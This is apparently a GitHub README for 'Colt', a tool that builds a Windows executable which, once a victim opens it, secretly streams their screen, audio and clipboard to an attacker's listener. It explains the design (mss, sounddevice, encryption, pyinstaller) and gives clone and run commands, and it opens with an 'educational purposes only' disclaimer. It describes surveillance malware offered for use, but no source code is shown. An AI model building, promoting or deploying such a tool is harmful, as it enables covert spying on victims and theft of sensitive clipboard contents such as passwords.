**THIS IS FOR EDUCATIONAL PURPOSES ONLY, DO NOT USE IT FOR MALICIOUS PURPOSES!!!**

# COLT

Colt is a "reverse screen sharer", what that means is that the attacker can generate an .exe file that when the victim opens, shares their entire screen, the audio, and their clipboard to the attacker while running background.

## How it works
YOU CAN ONLY GENERATE EXE FROM A WINDOWS SYSTEM RUNNING THIS SCRIPT.

The attacker can setup a listener and when the user opens the .exe file, connects to the attacker. The script on the vic side uses mss to send screen data and sounddevice for the audio. 

The data sent to the attacker server is encrypted and the attacker side decodes it(obvio)

The program uses pyinstaller to convert the py script to executable.

## How to use
Run this command to clone this repo:

` git clone https://github.com/chet-ag09/Colt.git `

Run this to start colt:

`python colt.py `
